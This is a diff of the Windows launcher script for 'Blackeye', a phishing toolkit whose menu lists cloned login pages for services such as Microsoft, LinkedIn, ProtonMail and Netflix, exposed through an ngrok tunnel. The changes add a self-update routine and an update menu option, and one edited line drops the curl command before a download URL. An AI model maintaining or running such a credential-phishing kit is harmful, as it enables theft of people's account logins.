@@ -1,13 +1,11 @@
 @echo off
 
-set ver=1.0.1
+set ver=v1.1.0
 title Blackeye for Windows %ver%
 
 set php="%CD%\php\php.exe"
 set ngrok="%CD%\ngrok.exe"
 set jq="%CD%\jq.exe"
-
-set mylink="https://github.com/HiDe-Techno-Tips/Blackeye-for-Windows/releases"
 
 :main
 	call :checkbin
@@ -39,8 +37,8 @@ exit /b 0
 		del %php%.zip
 	)
 	echo.
-	if exist %php% %php% -v
 	echo.
+	if exist %php% %php% -v
 
 	if not exist %ngrok% (
 		mkdir %ngrok%\.. >nul 2>&1
@@ -53,15 +51,19 @@ exit /b 0
 		tar -xf %ngrok%.zip -C %ngrok%\..
 		del %ngrok%.zip
 	)
+	echo.
 	if exist %ngrok% %ngrok% -v
 
 	if not exist %jq% (
 		echo.
 		echo Downloading jq
 		echo.
-		if %PROCESSOR_ARCHITECTURE%==AMD64 curl -LJ https://github.com/stedolan/jq/releases/download/jq-1.6/jq-win64.exe -o %jq%
-		if %PROCESSOR_ARCHITECTURE%==x86 curl -LJ https://github.com/stedolan/jq/releases/download/jq-1.6/jq-win32.exe -o %jq%
+		if %PROCESSOR_ARCHITECTURE%==AMD64 curl -LJ https://github.com/stedolan/jq/releases/latest/download/jq-win64.exe -o %jq%
+		if %PROCESSOR_ARCHITECTURE%==x86 https://github.com/stedolan/jq/releases/latest/download/jq-win32.exe -o %jq%
 	)
+	echo.
+	if exist %jq% %jq% --version
+
 exit /b 0
 
 :authngrok
@@ -100,7 +102,7 @@ rem Option Menu
 	echo 		[07] Origin		[22] Twitch		[37] Netflix
 	echo 		[08] Yahoo		[23] MySpace		[38] (ADVANCED) Custom page
 	echo 		[09] LinkedIn		[24] Badoo		[39] Extra Tools
-	echo 		[10] ProtonMail		[25] VK			
+	echo 		[10] ProtonMail		[25] VK			[40] Update
 	echo 		[11] WordPress		[26] Yandex		
 	echo 		[12] Microsoft		[27] DevianART		
 	echo 		[13] IGFollowers	[28] WiFi		
@@ -154,7 +156,12 @@ rem Option Menu
 			echo 		Will be available in version 2.0.0 and later. Current version is %ver%.
 			echo.
 			call :update
-			exit /b 0
+			start /b "" "%CD%\blackeye.bat"
+			exit /b 1
+		) else if "%sel%"=="40" (
+			call :update
+			start /b "" "%CD%\blackeye.bat"
+			exit /b 1
 		) else if "%sel%"=="" ( exit /b 1
 		) else ( echo Wrong Choice! Try Again
 			timeout /t 2 >nul
@@ -166,11 +173,31 @@ exit /b 0
 	echo Check for updates ^(y/n^)^?
 	choice /cs /c yYnN >nul
 	set u=%ERRORLEVEL%
-	if "%u%"=="1" (
-		start "" %mylink%
-	)
-	if "%u%"=="2" (
-		start "" %mylink%
+	set res=0
+	if "%u%"=="1" set res=1
+	if "%u%"=="2" set res=1
+	if "%res%"=="1" (
+		for /f %%g in ('curl -s https://api.github.com/repos/HiDe-Techno-Tips/Blackeye-for-windows/releases/latest ^| jq .tag_name') do (set lver=%%g)
+		if %ver%==%lver% (
+			echo You have the Latest version.
+			timeout /t 2 >nul
+		)
+		if not %ver%==%lver% (
+			echo Download %lver% ^(y/n^)^?
+			choice /cs /c yYnN >nul
+			set u=%ERRORLEVEL%
+			set res=0
+			if "%u%"=="1" set res=1
+			if "%u%"=="2" set res=1
+			if "%res%"=="1" (
+				echo.
+				echo Downloading Blackeye for Windows %lver%
+				echo.
+				curl -LJ https://github.com/HiDe-Techno-Tips/Blackeye-for-Windows/releases/latest/download/Blackeye-for-Windows.zip -o blackeye.zip
+				tar -xf blackeye.zip -C %CD%
+				del Blackeye.zip
+			)
+		)
 	)
 exit /b 0
 
@@ -206,8 +233,10 @@ exit /b 0
 	echo Open GitHub to report issue ^(y/n^)^?
 	choice /cs /c yYnN >nul
 	set c=%ERRORLEVEL%
-	if "%c%"=="1" start "" %mylink%
-	if "%c%"=="2" start "" %mylink%
+	set res=0
+	if "%c%"=="1" set res=1
+	if "%c%"=="2" set res=1
+	if "%res%"=="1" start "" "https://github.com/HiDe-Techno-Tips/Blackeye-for-Windows/issues/new"
 	exit /b 1
 	)
 
